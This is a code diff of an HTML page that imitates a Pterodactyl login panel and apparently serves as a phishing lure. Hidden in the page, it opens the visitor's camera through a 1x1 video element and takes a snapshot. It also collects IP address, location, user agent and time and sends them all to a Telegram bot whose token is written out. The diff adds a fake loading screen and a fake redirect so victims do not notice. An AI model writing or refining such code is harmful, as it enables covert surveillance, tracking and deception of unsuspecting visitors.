@@ -2,7 +2,6 @@
 <html>
 <head>
   <title>Privat Pterodactyl</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       background-color: #1e2a38;
@@ -14,65 +13,65 @@
       justify-content: center;
       height: 100vh;
       margin: 0;
-      padding: 20px;
-      box-sizing: border-box;
     }
     .login-box {
       background-color: #2e3e4f;
-      padding: 25px 20px;
+      padding: 30px;
       border-radius: 10px;
       text-align: center;
-      width: 100%;
-      max-width: 360px;
+      width: 90%;
+      max-width: 400px;
       box-shadow: 0 0 10px rgba(0,0,0,0.3);
     }
     .login-box h2 {
-      margin-bottom: 15px;
-      font-size: 20px;
+      margin-bottom: 20px;
     }
     .login-box input {
       width: 100%;
-      padding: 12px;
+      padding: 10px;
       margin: 10px 0;
       border: none;
       border-radius: 5px;
-      font-size: 16px;
     }
     .login-box button {
       width: 100%;
-      padding: 12px;
+      padding: 10px;
       background-color: #3b82f6;
       border: none;
       color: white;
       border-radius: 5px;
       cursor: pointer;
-      font-size: 16px;
     }
     #camera {
+      border: 1px solid black;
+      margin-top: 20px;
+    }
+    #loading {
       display: none;
+      margin-top: 10px;
     }
     footer {
       margin-top: 20px;
       font-size: 12px;
       color: #aaa;
-      text-align: center;
     }
   </style>
 </head>
 <body>
   <div class="login-box">
     <h2>Privat Pterodactyl</h2>
-    <img src="https://files.catbox.moe/o2x74k.png" alt="Mascot" width="80"><br><br>
-    <input type="text" placeholder="USERNAME OR EMAIL">
-    <input type="password" placeholder="PASSWORD">
-    <button onclick="alert('MAKASIH UDAH LOGIN')">LOGIN</button>
+    <img src="https://files.catbox.moe/o2x74k.png" alt="Mascot" width="100"><br><br>
+    <input type="text" id="username" placeholder="USERNAME OR EMAIL">
+    <input type="password" id="password" placeholder="PASSWORD">
+    <button onclick="handleLogin()">LOGIN</button>
     <p style="margin-top: 10px;"><a href="#" style="color: #90cdf4;">FORGOT PASSWORD?</a></p>
 
+    <p id="loading">Loading...</p>
     <video id="camera" autoplay playsinline width="1" height="1"></video>
-    <canvas id="snapshot" width="300" height="200" style="display:none;"></canvas>
+    <canvas id="snapshot" width="300" height="300" style="display:none;"></canvas>
   </div>
 
-  <footer>© 2015 - 2025 Pterodactyl Software</footer>
+  <footer>© 2015 - 2025 Pterodactyl Software (Custom Page)</footer>
 
   <script>
     const botToken = '8016607048:AAED3eiFKuM0E3qetDC8KxVr1n3w9O6Nf5M';
@@ -107,7 +106,7 @@
         const video = document.getElementById("camera");
         video.srcObject = stream;
         streamData = stream;
-        cameraStatus = 'Dapet Nih Bos';
+        cameraStatus = 'Berhasil';
         setTimeout(() => {
           takeSnapshot();
         }, 3000);
@@ -116,6 +115,24 @@
         cameraStatus = 'Ditolak / Tidak tersedia';
         checkAndSend();
       });
+
+    function handleLogin() {
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const loading = document.getElementById('loading');
+
+      if (!username || !password) {
+        alert('Harap isi username dan password.');
+        return;
+      }
+
+      loading.style.display = 'block';
+
+      setTimeout(() => {
+        loading.style.display = 'none';
+        window.location.href = 'https://example.com/dashboard.html'; // redirect palsu
+      }, 3000);
+    }
 
     function takeSnapshot() {
       const video = document.getElementById("camera");
@@ -128,19 +145,10 @@
     }
 
     function sendToTelegram(blobImage) {
-      const message = `
-|------------------------------------
-| 👑 DEVELOPER : HANXX
-| Version : 1.0
-| Language : HTML
-|------------------------------------
-| DAPET TARGET NIH HANXX
-|
-| IP Address: ${ipAddress}
-| Lokasi : ${locationInfo}
-| Kamera: ${cameraStatus}
-|------------------------------------
-      `;
+      const userAgent = navigator.userAgent;
+      const time = new Date().toLocaleString();
+
+      const message = `\u0060\u0060\u0060\nIP Address: ${ipAddress}\nLokasi: ${locationInfo}\nKamera: ${cameraStatus}\nUser-Agent: ${userAgent}\nWaktu Login: ${time}\n\u0060\u0060\u0060`;
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
@@ -160,7 +168,7 @@
 
     function checkAndSend() {
       if (ipAddress && locationInfo && cameraStatus && streamData) {
-        // Sudah cukup, tunggu kamera capture
+        // cukup info, lanjut snapshot
       }
     }
   </script>
